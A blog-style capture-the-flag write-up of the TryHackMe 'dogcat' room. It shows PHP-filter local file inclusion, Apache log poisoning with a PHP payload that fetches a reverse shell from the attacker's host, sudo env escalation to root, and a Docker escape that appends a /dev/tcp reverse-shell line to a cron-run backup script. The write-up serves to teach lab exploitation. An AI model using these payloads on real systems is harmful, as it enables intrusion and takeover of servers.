---
title: Try Hack Me DogCat Write-Up
tags:
- tryhackme
- writeup
image: /images/dog/info.png
---

Apart from the the name I really can't think of anything thats wrong with this box. It was a really fun box. I think I learnt the most during the initial foothold and after that the user,root and docker escaping was just like a CTF puzzle. The main thing I learnt in this room was the use cases of Local File inclusion. Before I used to think that LFI was just a vulnerability to read some files on a system. Turns out I was dead wrong hackers can really turn even the the simplest of the bugs to a fully fledged PWN. Lets see what I am talking about.

<!--more-->

<img src="/images/dog/info.png" height="400" width="700"/>

Starting with the usual nmap scan.

{%highlight text%}
nmap -T4 -Pn 10.10.104.158

Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-16 09:34 IST
Nmap scan report for 10.10.104.158
Host is up (0.23s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
{%endhighlight%}

So like most of the cases again we a ssh server and a web server. Browsing to the web page...

<img src="/images/dog/dog.png">

As much as I would love to keep clicking the dog and cat buttons to see some chonky bois we have a room to complete. Right off the bat I can see a LFI vulnerability in the view parameter. So I try `view=/../../../../../../../etc/passwd` but it says only dogs and cats are allowed. 

Next I leave testing the LFI and do some more enumeration. Here is the output for Dirbuster.

<img src="/images/dog/dirb.png" />

Nothing interesting apart from the "flag.php" file. Browsing to flag.php doesn't show any output. After playing around some more with the view parameter I find that
- It automatically appends .php extention to every file I give
- The view parameter must contain "dog" or "cat" string in the query
- I don't know jack about LFI

Here is an error which reveals some information 

<img src="/images/dog/error.png">

It was time to do some google-fu on LFI. I find this [awesome article](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601) which will give us the necessary information. So I come across a lot of new stuff like php wrappers. 

After trying some of the things given in the article I finally find a method that worked. We can use the php filter to get a resource from the machine and it will spit out its contents in base64 form. Lets try using a file we know already exists.

<img src="/images/dog/b64.png" width="1000">

When we decode it the content.

{%highlight text%}
echo PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg== | base64 -d
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
{%endhighlight%}

Now we can see what is going on inside the index.php file. We see a ext parameter which we can set to read files even if they not a php files. As observed there was indeed a check for "dog" and "cat" strings.

Now that we can read index.php we can read the flag.php file too which we found earlier in the dirbuster and that will give us our first flag. Next we find a technique known as Log File Contamination which I got to know of from the same medium article that I referenced earlier.

Basically this is what it does:

Since now we are able to read any file we can read the apache log files too. What we are going to do is we are going to add a small php script inside the request so that it gets stored in the logs. When we use the LFI to read those logs the php script will be executed like any other normal script. The extension of the file can be anything and as long as there is some php script in there it will be executed. We will use the inserted php code to download a reverse shell and when we browse to our reverse shell file we will have a netcat connection. 

First lets see if we can read the log files using the php filter and the ext parameter we found.

<img src="/images/dog/logs.png"/>

So that was a success. Next try introducing some php code in one of the headers to download a file from out server on the target machine. We will fire up a python server and transfer a php-reverse-shell.php (you can find it on pentest monkey) file onto the machine.  

- [How to download a file using php](https://www.geeksforgeeks.org/download-file-from-url-using-php/)

- [Log File Contamination](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)


No need to fire up Burp suite, the developer tools in firefox are powerfull enough. We will use this php payload.
{%highlight text%}
<?php $url='http://YourIP:1500/php-reverse-shell.php'; $file_name=basename($url);file_put_contents( $file_name,file_get_contents($url)); ?> 
{%endhighlight%}

Here is how.

<img src="/images/dog/contaminate.png" width="1000">

Send the request and when you load the access logs you wont see the php code but trust me it is getting executed. To see the proof start a python server in the directory where your php-reverse-shell.php file is stored. When you again access the log files you should see a request in your server for the file. something like this.

{%highlight text%}
python3 -m http.server 15000

Serving HTTP on 0.0.0.0 port 15000 (http://0.0.0.0:15000/) ...
10.10.24.222 - - [17/Sep/2020 17:32:40] "GET /php-reverse-shell.php HTTP/1.0" 200 -
{%endhighlight%}

So now that we have transfere the reverse shell, all we need to do is browse to it and we will hopefully get a netcat connection. 

{%highlight text%}
nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 10.10.6.31 42560 received!
Linux 92ceed6bbddb 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 05:31:30 up 50 min,  0 users,  load average: 0.00, 0.00, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
{%endhighlight%}

Finally we have a foothold. Next I just went straight for root since there is probably a flag in the root directory. Doing `sudo -l` we see the clue right away. We are allowed to use /usr/bin/env binary with root privileges. a quick look at [GTFO bins](https://gtfobins.github.io/gtfobins/env/) and we are done.

{%highlight text%}
$ sudo -l
Matching Defaults entries for www-data on 8336dd21a590:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 8336dd21a590:
    (root) NOPASSWD: /usr/bin/env
$ sudo /usr/bin/env /bin/bash
whoami
root
bash -i
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@8336dd21a590:/#
{%endhighlight%}

Aannd.... we are root already. You can find the flags in the root directory and the "/var/www/" directory. You can get a better shell with "/bin/bash -i" command if you like.

So that makes it 3 out of 4 flags. I remember looking at the docker tag under the room description. Lookslike we need to escape a docker conatiner. Looking online I found only the exploits which I can't even think of using due to the technicalities. I know that this is a medium level room only so lets try enumerating a bit more.

I look around and finally find something interesting inside the "/opt/" directory. We see a backup script and a backup file.

{%highlight text%}
root@8336dd21a590:/opt/backups# ls
ls
backup.sh
backup.tar
root@8336dd21a590:/opt/backups# cat backup.sh
cat backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
{%endhighlight%}

Whenever you see something related to backups it is probably a good idea to look at the the time they were last modified. That will give an idea if it is run very frequently or is it just some old forgotten file.

{%highlight text%}
root@8336dd21a590:/opt/backups# date
date
Thu Sep 17 12:11:16 UTC 2020
root@8336dd21a590:/opt/backups# ls -alt
ls -alt
total 2892
-rw-r--r-- 1 root root 2949120 Sep 17 12:11 backup.tar
-rwxr--r-- 1 root root     115 Sep 17 12:09 backup.sh
drwxr-xr-x 1 root root    4096 Sep 17 11:54 ..
drwxr-xr-x 2 root root    4096 Apr  8 12:38 .
{%endhighlight%}

Looks pretty recent to me. There is always a possiblity that this script is owned by the original owner of the machine and is run with their privileges. Lets add a line in the script to make a connection with our machine.

{%highlight text%}
root@8336dd21a590:/opt/backups# echo "bash -i >& /dev/tcp/YourIP/5678 0>&1" >> backup.sh
{%endhighlight%}

So when it is finally run automatically we will get  reverse shell as the real owner of the machine. Start up a netcat listener on another port that is not occupied. A few seconds later...

{%highlight text%}
nc -lvp 5678
Listening on [0.0.0.0] (family 0, port 5678)
Connection from 10.10.24.222 47332 received!
bash: cannot set terminal process group (2242): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# ls
ls
container
flag4.txt
{%endhighlight%}

We got the last flag. Really learned a lot during the foothold and the rest was easy. That is it from me for now. Vandan over and out!   



